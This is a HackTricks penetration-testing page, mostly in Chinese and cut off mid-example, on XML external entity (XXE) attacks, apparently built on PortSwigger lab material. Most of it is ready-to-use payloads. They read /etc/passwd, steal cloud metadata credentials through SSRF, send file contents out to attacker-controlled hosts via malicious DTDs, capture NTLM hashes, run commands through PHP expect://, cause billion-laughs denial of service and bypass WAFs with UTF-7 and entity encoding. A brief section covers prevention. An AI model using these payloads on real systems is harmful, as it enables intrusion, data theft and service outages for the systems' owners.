# XXE - XEE - XML外部实体

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

XML外部实体攻击是针对解析XML输入的应用程序的一种攻击类型。

## XML基础知识

**大部分内容基于这个出色的Portswigger页面：** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### 可扩展标记语言概述 <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

可扩展标记语言（XML）是一种用于存储和传输数据的标记语言。XML采用类似HTML的树状结构，由标签和数据组成，与预定义标签不同，XML具有灵活性，允许使用根据其封装数据的描述性命名的标签。在历史上，XML作为数据传输格式而备受推崇，尤其体现在对“AJAX”首字母缩写的贡献（其中“X”代表“XML”）。然而，随着JSON的流行，XML的受欢迎程度有所下降。

### 通过实体在XML中表示数据项 <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

在XML中，实体用作表示文档中数据项的机制，提供了一种替代直接插入数据的方法。XML规范包含各种内置实体。例如，`&lt;`和`&gt;`分别用于表示`<`和`>`字符。由于它们在标记XML标签方面的作用，这些元字符在数据中出现时通常必须使用实体来表示。

### 定义XML元素

在XML中，元素类型声明至关重要，因为它们为XML文档中元素的存在、类型和顺序建立了准则。举例说明包括：

- `<!ELEMENT stockCheck ANY>` 表示`<stockCheck></stockCheck>`元素可以包含任何类型的对象。
- `<!ELEMENT stockCheck EMPTY>` 指示`<stockCheck></stockCheck>`元素应保持无内容。
- `<!ELEMENT stockCheck (productId,storeId)>` 指定`<stockCheck>`元素只能包含`<productId>`和`<storeId>`作为子元素。

### 文档类型定义简介 <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

文档类型定义（DTD）在XML中发挥着关键作用，通过提供声明来规定XML文档的结构、允许的数据类型等。`DOCTYPE`元素是可选的，位于XML文档开头，可以声明一个DTD。DTD可以分为“内部”（完全嵌入在文档中）、“外部”（从外部源加载）或两者结合。

### 在XML中使用自定义实体 <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

XML允许在DTD中定义自定义实体。一个示例声明：

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

这样的声明表明文档中的实体引用`&myentity;`将替换为“my entity value”。

### 在XML中引入外部实体 <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

XML中的外部实体是自定义实体的一个子类型，其定义位于DTD之外。这些实体使用`SYSTEM`关键字，并需要指定一个URL，该URL指定实体值的获取位置，从而可能实现[XML外部实体攻击](https://portswigger.net/web-security/xxe)。

### 利用XML参数实体进行XXE检测

在标准实体无法利用XXE漏洞进行攻击的情况下，由于验证或XML解析器加固，可以使用XML参数实体。XML参数实体以百分号字符作为实体名称之前的标志，并使用相同字符引用，仅在DTD中引用。它们可以通过带外方法促成盲目XXE检测，例如发起DNS查找和HTTP请求到攻击者控制的域，从而确认攻击的成功。


## 主要攻击

**[大部分这些攻击是使用出色的Portswiggers XEE实验室进行测试的：https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### 新实体测试

在这次攻击中，我将测试一个简单的新实体声明是否有效。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### 读取文件

让我们尝试以不同的方式读取 `/etc/passwd` 文件。对于Windows，您可以尝试读取：`C:\windows\system32\drivers\etc\hosts`

在第一个案例中，请注意SYSTEM "_\*\*file:///\*\*etc/passwd_" 也可以工作。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
这第二种情况应该对提取文件很有用，如果Web服务器正在使用PHP（不是Portswiggers实验的情况）。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
在这第三个案例中，请注意我们将`Element stockCheck`声明为ANY
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### 目录列表

在基于**Java**的应用程序中，可以通过类似以下负载的XXE来**列出目录的内容**（只请求目录而不是文件）：
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE可能被用来滥用云中的SSRF
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### 盲 SSRF

使用**先前评论的技术**，您可以让服务器访问您控制的服务器以显示其存在漏洞。但是，如果这种方法不起作用，可能是因为**不允许使用 XML 实体**，在这种情况下，您可以尝试使用**XML 参数实体**：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "盲" SSRF - 通过外带方式泄露数据

**在这种情况下，我们将让服务器加载一个带有恶意载荷的新DTD，该载荷将通过HTTP请求发送文件内容（对于多行文件，您可以尝试通过** _**ftp://**_**进行外带）。这个解释是基于** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)**。**

在给定的恶意DTD中，进行了一系列步骤来外带数据：

### 恶意DTD示例：
结构如下：
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
这个DTD执行的步骤包括：

1. **参数实体的定义:**
- 创建一个XML参数实体 `%file`，读取 `/etc/hostname` 文件的内容。
- 定义另一个XML参数实体 `%eval`。它动态声明一个新的XML参数实体 `%exfiltrate`。`%exfiltrate` 实体被设置为向攻击者服务器发起HTTP请求，在URL的查询字符串中传递 `%file` 实体的内容。

2. **实体的执行:**
- 使用 `%eval` 实体，导致动态声明 `%exfiltrate` 实体的执行。
- 然后使用 `%exfiltrate` 实体，触发向指定URL发送文件内容的HTTP请求。

攻击者将这个恶意的DTD托管在他们控制下的服务器上，通常在类似 `http://web-attacker.com/malicious.dtd` 的URL上。

**XXE Payload:**
为了利用一个存在漏洞的应用程序，攻击者发送一个XXE有效载荷：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
这个 payload 定义了一个 XML 参数实体 `%xxe` 并将其合并到 DTD 中。当被 XML 解析器处理时，这个 payload 从攻击者的服务器中获取外部 DTD。然后解析器内联解释 DTD，执行恶意 DTD 中概述的步骤，导致将 `/etc/hostname` 文件泄露到攻击者的服务器。

### 基于错误的（外部 DTD）

**在这种情况下，我们将让服务器加载一个恶意的 DTD，该 DTD 将在错误消息中显示文件的内容（仅在您能看到错误消息时有效）。** [**示例在这里。**](https://portswigger.net/web-security/xxe/blind)

您可以使用恶意的外部 DTD 触发一个包含 `/etc/passwd` 文件内容的 XML 解析错误消息，方法如下：
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
这个DTD执行以下步骤：

* 定义一个名为 `file` 的XML参数实体，包含 `/etc/passwd` 文件的内容。
* 定义一个名为 `eval` 的XML参数实体，包含另一个名为 `error` 的XML参数实体的动态声明。`error` 实体将通过加载一个包含 `file` 实体值的不存在文件来进行评估。
* 使用 `eval` 实体，导致执行 `error` 实体的动态声明。
* 使用 `error` 实体，使其值通过尝试加载不存在的文件进行评估，导致包含不存在文件名的错误消息，该文件名即为 `/etc/passwd` 文件的内容。

调用外部DTD错误：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **基于错误的 (system DTD)**

那么当**阻止带外交互**（外部连接不可用）时，盲目XXE漏洞如何处理呢？

XML语言规范中的一个漏洞可以通过错误消息**暴露敏感数据**，当文档的DTD混合了内部和外部声明时。这个问题允许在内部重新定义在外部声明的实体，促进基于错误的XXE攻击的执行。这种攻击利用了在内部DTD中重新定义XML参数实体，该实体最初在外部DTD中声明。当服务器阻止带外连接时，攻击者必须依赖本地DTD文件来进行攻击，旨在诱发解析错误以揭示敏感信息。

考虑一个场景，服务器的文件系统包含一个位于`/usr/local/app/schema.dtd`的DTD文件，定义了一个名为`custom_entity`的实体。攻击者可以通过提交混合DTD来诱发XML解析错误，从而揭示`/etc/passwd`文件的内容：
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
以下是由此DTD执行的步骤：

- 定义了一个名为`local_dtd`的XML参数实体，其中包含位于服务器文件系统上的外部DTD文件。
- 对最初在外部DTD中定义的`custom_entity` XML参数实体进行重新定义，以封装一个[基于错误的XXE利用](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)。这种重新定义旨在引发解析错误，从而暴露`/etc/passwd`文件的内容。
- 通过使用`local_dtd`实体，启用了外部DTD，包含了新定义的`custom_entity`。这一系列操作导致了利用所针对的错误消息的发出。

**真实世界示例：** 使用GNOME桌面环境的系统通常在`/usr/share/yelp/dtd/docbookx.dtd`中包含一个名为`ISOamso`的实体。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

由于这种技术使用**内部 DTD**，您首先需要找到一个有效的 DTD。您可以通过**安装**与服务器相同的**操作系统/软件**，然后**搜索一些默认的 DTD**，或者**获取系统中默认 DTD 的列表**，然后**检查**是否存在任何一个：
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
更多信息请查看[https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### 在系统中查找DTDs

在以下令人敬畏的github存储库中，您可以找到**可能存在于系统中的DTDs的路径**：

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

此外，如果您有**受害系统的Docker镜像**，您可以使用相同存储库中的工具**扫描**该**镜像**并**查找**系统中存在的**DTDs**的路径。阅读[github的Readme](https://github.com/GoSecure/dtd-finder)以了解详情。
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### 通过 Office Open XML 解析器进行 XXE 攻击

要深入了解此攻击，请查看 Detectify 的[这篇精彩文章](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/)的第二部分。

许多 Web 应用程序提供了上传 Microsoft Office 文档的功能，然后从这些文档中提取某些详细信息。例如，Web 应用程序可能允许用户通过上传 XLSX 格式的电子表格来导入数据。为了从电子表格中提取数据，解析器必然需要解析至少一个 XML 文件。

要测试此漏洞，需要创建一个包含 XXE 负载的 Microsoft Office 文件。第一步是创建一个空目录，以便可以将文档解压缩到其中。

文档解压缩后，应打开位于 `./unzipped/word/document.xml` 的 XML 文件，并在首选文本编辑器（如 vim）中进行编辑。应修改 XML 以包含所需的 XXE 负载，通常以 HTTP 请求开头。

修改后的 XML 行应插入在两个根 XML 对象之间。重要的是将 URL 替换为可监控请求的 URL。

最后，可以将文件压缩为恶意 poc.docx 文件。从先前创建的“unzipped”目录中，应运行以下命令：

现在，可以将创建的文件上传到可能存在漏洞的 Web 应用程序，并希望在 Burp Collaborator 日志中出现请求。


### Jar 协议

`jar` 协议仅适用于 Java 应用程序。它允许访问 PKZIP 文件（`.zip`、`.jar` 等）中的文件，并适用于本地和远程文件：
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
访问 PKZIP 文件内部的文件对于通过系统DTD文件滥用XXE非常有用。查看[此部分以了解如何滥用系统DTD文件](xxe-xee-xml-external-entity.md#error-based-system-dtd)。
{% endhint %}

#### 幕后

1. 发起HTTP请求以加载zip存档。`https://download.host.com/myarchive.zip`
2. 将HTTP响应保存到临时位置。`/tmp/...`
3. 解压存档。
4. 读取`file.zip`
5. 删除临时文件。

请注意，可以在第二步中停止流程。诀窍是在提供文件时永远不要关闭连接。[这些工具可能会有所帮助](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)：一个是Python中的`slow_http_server.py`，另一个是Java中的`slowserver.jar`。

一旦服务器下载了您的文件，您需要通过浏览临时目录来找到其位置。由于路径是随机的，因此无法提前预测文件路径。

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
将文件写入临时目录可以帮助**升级涉及路径遍历的另一个漏洞**（例如本地文件包含、模板注入、XSLT RCE、反序列化等）。
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### 十亿笑攻击
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml 攻击
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### 二次方爆炸攻击

![](<../.gitbook/assets/image (531).png>)

#### 获取 NTML

在 Windows 主机上，可以通过设置 responder.py 处理程序来获取 Web 服务器用户的 NTML 哈希值：
```
Responder.py -I eth0 -v
```
通过发送以下请求
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## 隐藏的XXE表面

### XInclude

在某些情况下，**客户端发送的数据在解析之前会被服务器端处理并合并到一个XML文档中**。这通常发生在客户端数据被整合到一个**后端SOAP请求**中，随后由后端的SOAP服务处理。

在这些情况下，执行传统的XXE（XML外部实体）攻击变得具有挑战性，因为对XML文档整体的控制受限，特别是无法修改或引入`DOCTYPE`元素。然而，利用`XInclude`，这是XML标准的一个功能，它允许从较小的子文档组装一个XML文档，提供了一种解决方法。这种方法允许在XML文档的任何数据元素中进行`XInclude`攻击，在服务器生成的XML文档中嵌入数据时，这种攻击是可行的。

要发起一个`XInclude`攻击，需要包含`XInclude`命名空间，并指定要包含的文件路径。以下示例演示了如何构建这样一种攻击：
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
查看[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)获取更多信息！

### SVG - 文件上传

用户上传到某些应用程序的文件，然后在服务器上进行处理，可能会利用处理 XML 或包含 XML 的文件格式的漏洞。常见的文件格式如办公文档（DOCX）和图像（SVG）都是基于 XML 的。

当用户**上传图像**时，这些图像会在服务器端进行处理或验证。即使是期望 PNG 或 JPEG 等格式的应用程序，**服务器的图像处理库也可能支持 SVG 图像**。SVG 作为基于 XML 的格式，可以被攻击者利用来提交恶意 SVG 图像，从而使服务器暴露于 XXE（XML External Entity）漏洞。

下面展示了这种利用的示例，其中恶意 SVG 图像尝试读取系统文件：
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
另一种方法涉及尝试通过PHP的“expect”包装器执行命令：
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
在这两种情况下，SVG 格式被用来发动攻击，利用服务器软件的 XML 处理能力，突显了强大的输入验证和安全措施的必要性。

查看[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)获取更多信息！

**请注意读取文件的第一行或执行结果将出现在创建的图像内部。因此，您需要能够访问 SVG 创建的图像。**

### **PDF - 文件上传**

阅读以下文章以**了解如何利用 XXE 上传 PDF 文件**：

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: 从 x-www-urlencoded 到 XML

如果 POST 请求接受 XML 格式的数据，您可以尝试在该请求中利用 XXE。例如，如果正常请求包含以下内容：
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
然后您可能能够提交以下请求，结果相同：
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: 从 JSON 到 XEE

要更改请求，您可以使用一个名为“**Content Type Converter**”的 Burp 扩展。[在这里](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html)您可以找到这个示例：
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
另一个示例可以在[这里](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)找到。

## WAF & Protections Bypasses

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
这仅在XML服务器接受`data://`协议时才有效。

### UTF-7

您可以在此处使用\[**CyberChef的“编码配方”**](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)将其转换为UTF-7。
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### 文件:/ 协议绕过

如果网站使用 PHP，可以使用 **php wrappers** `php://filter/convert.base64-encode/resource=` 来**访问内部文件**，而不是使用 `file:/`。

如果网站使用 Java，您可以查看[**jar: 协议**](xxe-xee-xml-external-entity.md#jar-protocol)。

### HTML 实体

来自 [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
您可以创建一个**实体内部的实体**，使用**html实体**对其进行编码，然后调用它来**加载一个dtd**。\
请注意，所使用的**HTML实体**需要是**数字**的（例如\[在这个例子中]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C))。
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD 示例：

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP包装器

### Base64

**提取** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **提取外部资源**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### 远程代码执行

**如果加载了 PHP 的 "expect" 模块**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

### **XML External Entity (XEE) Attack**

XML External Entity (XXE) attacks occur when an attacker is able to inject malicious XML content into an XML document processed by a web application. This attack can lead to sensitive data exposure, server-side request forgery (SSRF), and remote code execution.

#### **Detecting XEE Vulnerabilities**

To detect XEE vulnerabilities, you can send a SOAP request with a malicious XML payload containing an external entity reference pointing to a file on the server. If the application processes the external entity and includes the file content in the response, it is vulnerable to XEE attacks.

#### **Exploiting XEE Vulnerabilities**

Exploiting XEE vulnerabilities allows an attacker to read files from the server, conduct SSRF attacks, and execute arbitrary code on the server. By manipulating the XML payload, an attacker can retrieve sensitive information or perform unauthorized actions.

#### **Preventing XEE Attacks**

To prevent XEE attacks, disable external entity processing in XML parsers, use whitelists to validate input, and sanitize user-supplied XML input. Additionally, consider using newer XML technologies like XML Schema Definition (XSD) to validate XML structures.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

这个例子受到了[https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)的启发。

XLIFF（XML本地化交换文件格式）用于标准化本地化过程中的数据交换。这是一种基于XML的格式，主要用于在本地化过程中在工具之间传输可本地化数据，并作为CAT（计算机辅助翻译）工具的常见交换格式。

### 盲目请求分析

向服务器发出以下内容的请求：
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
然而，这个请求触发了一个内部服务器错误，明确提到了与标记声明有关的问题：
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
尽管出现错误，但在Burp Collaborator上记录了一次命中，表明与外部实体有一定程度的交互。

带外数据泄露
为了将数据外泄，发送了一个修改过的请求：
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
这种方法显示用户代理指示使用Java 1.8。Java的这个版本存在一个已知限制，即无法使用带有换行符（如/etc/passwd）的文件来检索文件，使用带外技术。

基于错误的数据泄露
为了克服这个限制，采用了基于错误的方法。DTD文件的结构如下，以触发包含目标文件数据的错误：
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
服务器响应错误，重要的是反映了不存在的文件，表明服务器正在尝试访问指定的文件：
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
要在错误消息中包含文件内容，需要调整DTD文件：
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
这种修改导致文件内容成功外泄，因为它反映在通过HTTP发送的错误输出中。这表明成功利用XXE（XML外部实体）攻击，利用带外和基于错误的技术来提取敏感信息。


## RSS - XEE

包含RSS格式的有效XML，用于利用XXE漏洞。

### 回显

向攻击者服务器发出简单的HTTP请求
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
